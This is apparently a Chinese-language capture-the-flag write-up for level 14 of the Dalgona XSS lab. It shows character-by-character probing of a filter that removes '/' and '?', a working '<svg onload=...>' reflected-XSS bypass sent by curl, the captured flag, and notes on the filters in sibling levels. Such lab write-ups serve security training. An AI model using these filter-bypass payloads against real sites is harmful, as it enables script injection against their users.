## 题解

### 入口与指纹

`Werkzeug/1.0.1` + `Python/2.7.18`，Dalgona 靶场第 14 关
（样式表 `static/css/xss/xss14.css`，标题 `Dalgona - Triangle`）。

入口 `Page` → `GET /page?name=...`，反射在文本节点，
失败文案是同族的 `Oops! You did an alert with TypeError: … instead of "XSS"`。

### 关键观察

**1. 过滤器只删两个字符：`/` 和 `?`。**

逐字符探测（`Q<ch>Q` 看反射）：

```text
altered chars: ['/', '?']
```

其他都可打印字符（含空格、引号、`<`、`>`、`=`）全部原样保留。

**2. 因此不能用自闭合写法，但空格分隔完全够用。**

```text
<svg/onload=alert("XSS")   →  <svgonload=alert("XSS")   （斜杠被删，标签坏了）
<svg onload=alert("XSS")>  →  原样保留
```

### 利用链

```bash
T=$(head -1 .target)
curl -sS --get \
  --data-urlencode 'name=<svg onload=alert("XSS")>' \
  "http://$T/page" \
| grep -o 'flag{[^}]*}'
```

```text
flag{a9fa9436-adac-45af-90b3-465f0618ee61}
```

## 复盘

- **先做逐字符探测，别猜黑名单。** 94 个字符各提交一次，直接得出「只删 `/` 和 `?`」。
  这比逐个试 payload 快，而且能立刻排除「关键字黑名单」这种方向。
- **`/` 被删时，用空格代替。** HTML 属性分隔符本来就是空白，`<svg onload=…>`
  与 `<svg/onload=…>` 等价，所以「防自闭合」的过滤其实没有实际效果。
- **`?` 被删暗示作者想拦 `javascript:` 或 `?>`**，但那不是本题的绕过点——
  本题用事件处理器即可，不需要 URL 或标签闭合。
- **同族里 004/008 的 `autofocus+onfocus` 在这里失败**（`<input autofocus onfocus=…>`
  返回 False）：说明本关的判据不是「能触发任何事件」，而是要求特定标签/时序。
  `svg onload` 和 `body onload` 都一次通过，`img onerror` 反而失败。
- **该靶场族的过滤规则差异极大**（004/008 拦事件名、010 拦全部字母数字、
  011/015 删完整标签、012 删标签前缀与引号 XSS、013 拦 `alert`/`confirm`、
  016 拦空白、046 只删 `/` 和 `?`），每关必须重新探测。
